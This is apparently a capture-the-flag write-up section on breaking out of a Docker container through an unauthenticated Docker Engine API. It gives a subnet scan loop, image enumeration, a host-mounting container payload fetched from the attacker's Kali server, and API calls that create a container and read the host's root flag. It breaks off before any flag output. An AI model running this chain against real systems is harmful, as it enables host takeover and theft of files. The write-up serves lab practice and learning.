Privilege Escalation: Docker API Breakout
Inside the container, we observe:

bash
hostname           # 821fbd6a43fa (container ID)
ip addr            # eth0 172.18.0.3/16
This is a Docker container. We scan the internal network for exposed Docker Engine API (port 2375):

bash
for i in $(seq 1 254); do
  (curl -s --connect-timeout 1 http://192.168.65.$i:2375/version 2>/dev/null | grep -q "ApiVersion" && echo "192.168.65.$i:2375 OPEN") &
done
wait
Result: 192.168.65.7:2375 OPEN

Enumerating Docker API
bash
curl http://192.168.65.7:2375/version
Returns Docker Engine version 28.3.2.

List available images:

bash
curl -s http://192.168.65.7:2375/images/json | grep -o '"RepoTags":\[[^]]*\]'
Output includes:

docker_setup-nginx-php:latest

docker_setup-mariadb:latest

alpine:latest

The Docker API is unauthenticated, allowing us to create privileged containers with host filesystem mounts.

Exploiting to Read Root Flag
Prepare container JSON payload on Kali:

json
{
  "Image": "alpine:latest",
  "Cmd": ["/bin/sh", "-c", "cat /mnt/host_root/Users/Administrator/Desktop/root.txt"],
  "HostConfig": {
    "Binds": ["/mnt/host/c:/mnt/host_root"]
  },
  "Tty": true,
  "OpenStdin": true
}
Save as container.json.

Serve the file from Kali (since www-data shell may lack tools to write files easily):

bash
cd /tmp && python3 -m http.server 8000
Download and execute from victim shell:

bash
curl http://<KALI_IP>:8000/container.json -o /tmp/container.json
curl -X POST -H "Content-Type: application/json" -d @/tmp/container.json \
     http://192.168.65.7:2375/containers/create?name=pwned
Response returns container ID, e.g. 7d99df11ee0f....

Start the container:

bash
curl -X POST http://192.168.65.7:2375/containers/7d99df11ee0f/start
Retrieve logs (contains the flag):

bash
curl -s "http://192.168.65.7:2375/containers/7d99df11ee0f/logs?stdout=true&stderr=true"
Root Flag
The output contains the root flag from the mounted host drive:

text
